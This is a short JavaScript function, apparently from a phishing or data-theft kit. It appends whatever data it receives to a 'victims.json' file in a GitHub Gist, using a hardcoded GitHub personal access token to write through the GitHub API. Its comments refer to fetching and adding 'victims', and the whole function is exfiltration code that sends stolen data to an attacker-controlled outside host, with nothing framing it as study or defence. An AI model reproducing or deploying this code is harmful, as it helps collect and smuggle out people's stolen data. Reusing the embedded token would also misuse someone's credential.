async function send(data) {
  // Get current gist content
  const GIST_ID = "4e10b7a4291afa8d6fa44a3917170c43.js";        // 👈 Replace with your gist ID (from URL)
  const USERNAME = "cc3784157-oss"; // 👈 Replace with your GitHub username
  const TOKEN = "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"; // ← LEAVE EMPTY for now (we'll fix)

  const url = `https://api.github.com/gists/${GIST_ID}`;

  try {
    // Fetch current victims
    const res = await fetch(url);
    const gist = await res.json();
    const file = gist.files["victims.json"];
    let victims = [];

    if (file && file.content) {
      try {
        victims = JSON.parse(file.content);
      } catch (e) {}
    }

    // Add new victim
    victims.push({ ...data, timestamp: new Date().toISOString() });

    // Update gist
    await fetch(url, {
      method: "PATCH",
      headers: {
        "Authorization": `token ${TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        "files": {
          "victims.json": {
            "content": JSON.stringify(victims, null, 2)
          }
        }
      })
    });
  } catch (e) {
    console.log("Failed to log", e);
  }
}
